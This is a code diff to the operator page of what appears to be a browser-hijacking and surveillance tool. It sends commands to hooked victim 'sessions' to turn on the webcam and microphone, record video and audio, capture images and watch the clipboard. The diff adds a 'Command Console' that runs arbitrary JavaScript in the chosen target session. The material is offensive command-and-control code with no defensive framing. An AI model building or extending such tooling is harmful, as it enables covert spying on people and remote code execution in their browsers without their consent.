@@ -3,7 +3,6 @@
 
 import { useState, useEffect, useRef } from 'react';
 import { LiveTracker, type TrackedEvent } from '@/components/live-tracker';
-import { AdvancedPageCloner } from '@/components/advanced-page-cloner';
 import { JavaScriptLibrary, type JsPayload } from '@/components/javascript-library';
 import { Separator } from '@/components/ui/separator';
 import { useLocalStorage } from '@/hooks/use-local-storage';
@@ -14,12 +13,14 @@ import { ClipboardMonitor } from '@/components/clipboard-monitor';
 import { SessionHistory } from '@/components/session-history';
 import { Card, CardContent, CardHeader, CardTitle, CardDescription } from '@/components/ui/card';
 import { Badge } from '@/components/ui/badge';
-import { Webcam, Video, Mic } from 'lucide-react';
+import { Webcam, Video, Mic, Terminal } from 'lucide-react';
 import { Button } from '@/components/ui/button';
 import { useToast } from '@/hooks/use-toast';
 import { useAuth } from '@/hooks/use-auth';
 import { logActivity } from '@/services/activity-log-service';
 import Image from 'next/image';
+import { Textarea } from '@/components/ui/textarea';
+import { Label } from '@/components/ui/label';
 
 export default function LiveTrackerPage() {
   const [selectedPayload, setSelectedPayload] = useState<JsPayload | null>(null);
@@ -30,6 +31,8 @@ export default function LiveTrackerPage() {
   const [isMicActive, setIsMicActive] = useState(false);
   const [isRecording, setIsRecording] = useState<'video' | 'audio' | null>(null);
   const [liveFeedSrc, setLiveFeedSrc] = useState<string | null>(null);
+  
+  const [command, setCommand] = useState('');
   
   const { toast } = useToast();
   const { user } = useAuth();
@@ -105,14 +108,33 @@ export default function LiveTrackerPage() {
     }
   }, [sessionsMap, selectedSessionId]);
 
-  const sendCommandToSession = (command: string) => {
+  const sendCommandToSession = (command: string, isJsCode = false) => {
     if (!selectedSessionId) {
         toast({ variant: 'destructive', title: 'No session selected' });
         return;
     }
-    channelRef.current?.postMessage({ type: 'command', sessionId: selectedSessionId, command });
-    logActivity({ user: user?.displayName || 'Operator', action: `Sent command: ${command}`, details: `Session: ${selectedSessionId}` });
+    
+    const payload = { 
+        type: 'command', 
+        sessionId: selectedSessionId, 
+        command: isJsCode ? 'execute-js' : command,
+        ...(isJsCode && { code: command })
+    };
+    
+    channelRef.current?.postMessage(payload);
+    
+    const action = isJsCode ? 'Sent JS Command' : `Sent command: ${command}`;
+    const details = isJsCode ? `Code: ${command.substring(0, 50)}...` : `Session: ${selectedSessionId}`;
+    
+    logActivity({ user: user?.displayName || 'Operator', action, details });
   };
+  
+  const handleSendCommandConsole = () => {
+      if (!command) return;
+      sendCommandToSession(command, true);
+      toast({ title: "Command Sent", description: "The JavaScript command has been sent to the target."});
+      setCommand('');
+  }
   
   const handleRecording = (type: 'video' | 'audio') => {
       const command = `start-${type}-record`;
@@ -172,6 +194,18 @@ export default function LiveTrackerPage() {
                       <Button onClick={handleStopRecording} disabled={!isRecording} variant="destructive" className="col-span-2">Stop Recording</Button>
                       <Button onClick={() => sendCommandToSession('capture-image')} disabled={!isCameraActive} className="col-span-2">Capture Image</Button>
                   </div>
+              </CardContent>
+            </Card>
+            
+            <Card>
+              <CardHeader>
+                  <CardTitle className="text-lg flex items-center gap-2"><Terminal className="h-5 w-5"/> Command Console</CardTitle>
+                  <CardDescription>Execute arbitrary JavaScript in the selected session.</CardDescription>
+              </CardHeader>
+              <CardContent className="space-y-2">
+                  <Label htmlFor="js-command">JavaScript Code</Label>
+                  <Textarea id="js-command" value={command} onChange={(e) => setCommand(e.target.value)} className="font-mono h-24" placeholder="e.g., alert(document.domain)"/>
+                  <Button onClick={handleSendCommandConsole} disabled={!selectedSessionId || !command} className="w-full">Send Command</Button>
               </CardContent>
             </Card>
 
